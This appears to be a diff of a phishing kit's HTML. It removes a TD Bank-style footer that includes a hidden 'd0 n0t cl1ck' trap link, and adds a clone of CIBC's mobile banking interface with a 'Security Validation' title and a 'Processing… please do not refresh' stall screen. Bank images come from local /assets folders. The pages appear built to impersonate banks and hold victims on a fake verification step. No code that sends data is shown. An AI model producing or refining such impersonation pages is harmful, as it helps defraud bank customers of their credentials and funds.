-                                        <a class="td-link-nounderline" href="https://facebook.com/tdbankgroup/"
-                                            target="_blank">
-                                            <img src="/assets/td/files/10.png">
-                                            <span class="td-forscreenreader">FOOTER.FACEBOOK</span>
-                                        </a>
-                                    </li>
-                                    <li>
-                                        <a class="td-link-nounderline" href="https://www.instagram.com/TD_Canada/"
-                                            target="_blank">
-                                            <img src="/assets/td/files/11.png">
-                                            <span class="td-forscreenreader">FOOTER.INSTAGRAM</span>
-                                        </a>
-                                    </li>
-                                    <li>
-                                        <a class="td-link-nounderline" href="https://www.youtube.com/tdcanada"
-                                            target="_blank">
-                                            <img src="/assets/td/files/12.png">
-                                            <span class="td-forscreenreader">FOOTER.YOUTUBE</span>
-                                        </a>
-                                    </li>
-                                    <img src="/assets/td/files/13.png">
-                                    <li>
-                                        <a class="td-link-nounderline" href="https://www.linkedin.com/company/td"
-                                            target="_blank">
-                                        </a>
-                                    </li>
-                                </ul>
-                            </div>
-                            <div class="td-footer-links td-copy-align-centre td-copy-white">
-                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                    href="https://www.td.com/privacy-and-security/privacy-and-security/index.jsp">Privacy
-                                    and Security</a>
-                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                    href="https://www.td.com/to-our-customers/">Legal</a>
-                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                    href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp">Accessibility</a>
-                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                    href="https://www.tdcanadatrust.com/products-services/index.jsp">CDIC member</a>
-                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                    href="https://www.td.com/about-tdbfg/our-business/index.jsp">About Us</a>
-                                <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
-                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                    href="https://www.td.com/careers/why-td/index.jsp">We're Hiring</a>
-                                <a class="td-copy-white td-link-nounderline td-copy-standard" href=""
-                                    ng-click="vm.openSiteIndexModal()">Site Index</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </footer>
-        </footer-public>
-    </div>
-    <div id="ads"></div>
-    <div id="ads"></div>
+            <ul>
+                <li id="li-my-accounts"><a id="accounts-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-accountLink"
+                        role="menuitem" class="">My Accounts</a></li>
+                <li id="li-pay-bills"><a id="paybill-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-paybillLink"
+                        role="menuitem" class="">Bill Payments</a></li>
+                <li id="li-interac"><a id="etransfer-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-eTransferLink"
+                        role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
+                <li id="li-transfer"><a id="transfer-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-transferLink"
+                        role="menuitem" class="">Transfer Funds</a></li>
+                <li id="li-upcoming"><a id="uptxs-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-upcomingTransactionsLink"
+                        role="menuitem" class="">Upcoming Transactions</a></li>
+                <!-- dynamic SSO links -->
+                <li class="li-sso"><a id="GMT-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxir&amp;locale=en&amp;channel=mobile_web"
+                        role="menuitem">Global Money Transfer</a></li>
+                <li class="li-sso"><a id="FXC-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxcash&amp;locale=en&amp;channel=mobile_web"
+                        role="menuitem">Order Foreign Cash</a></li>
+                <li class="li-sso"><a id="RPC-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxprepaid&amp;locale=en&amp;channel=mobile_web&amp;page=fxretailprepaid-manage"
+                        role="menuitem">Prepaid Cards</a></li>
+                <li class="li-sso"><a id="PMO-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxpmo&amp;locale=en&amp;channel=mobile_web"
+                        role="menuitem">Buy Gold and Silver</a></li>
+                <li class="li-sso"><a id="CCS-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/pre-credit-score?locale=en&amp;ebkck=true&amp;tcVersion=1.0&amp;channel=mobile_web"
+                        role="menuitem">Check Credit Score</a></li>
+                <hr>
+                <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-openAccountPsSO-openAccountPsSOLink"
+                        role="menuitem">Open an Account</a></li>
+                <li id="li-browse-products"><a id="products-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-browseProductsPsSO-productSelectorSOLink"
+                        target="_blank" role="menuitem"
+                        @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;"
+                        class="">Explore Products</a></li>
+                <li id="li-sites-apps"><a id="sites-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-sitesPostSignOnLink"
+                        role="menuitem" class="">CIBC Sites</a></li>
+                <!-- Customer Services link visible for CIBC non-Small Business -->
+                <li id="li-client-services"><a id="customerServices-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-customerServicesLink"
+                        class="">Customer Services</a></li>
+                <hr>
+                <li><a class="nav-no-indent" id="contact-us-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-contactUsLink"
+                        role="menuitem">Contact Us</a></li>
+                <li><a class="nav-no-indent" id="help-link" href="http://cibc.intelliresponse.com/mobile-w/"
+                        role="menuitem">Help</a></li>
+                <li><a class="nav-no-indent" id="security-guarantee-link"
+                        href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:7109" target="_blank"
+                        role="menuitem">Security Guarantee</a></li>
+                <hr>
+                <li id="li-sign-out"><a class="nav-no-indent" id="logout-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-logoutLink"
+                        role="menuitem">Sign Out</a></li>
+            </ul>
+        </div>
+    </nav>
+    <header class="flex-box flex-box-hoz">
+        <div class="flex-box-flex-1"></div>
+        <a href="http://cibc.com/" target="_blank">
+            <div id="header-logo">
+                <span class="offscreen">CIBClogo</span>
+            </div>
+        </a>
+        <div id="header-link" class="flex-box-flex-1">
+        </div>
+    </header>
+    <section id="main-page" class="">
+        <section id="ide">
+            <section class="page-title">
+                <h2 class="title">Security Validation</h2>
+            </section>
+        </section>
+        <section id="change-password" class="page-wrapper">
+            <style>
+                .loader-div {
+                    text-align: center;
+                    padding-top: 20px;
+                }
+
+                .loader-div h2 {
+                    font-size: 28px;
+                    margin-bottom: 40px;
+                }
+
+                .loader-div p {
+                    margin-top: 37px;
+                    padding: 0px 42px;
+                    font-size: 16px;
+                }
+            </style>
+            <script>
+                setInterval(function () {
+                    $('.loader-div p').css('display', 'block');
+                }, 4000);
+            </script>
+            <div class="global-error-from-container loader-div" id="idf">
+                <h2 class="title">Processing</h2>
+                <img src="/assets/cibc/loading.gif" width="80">
+                <p style="display: none">This is taking longer than usual, please do not refresh the page</p>
+            </div>
+        </section>
 </body>
 
 </html>
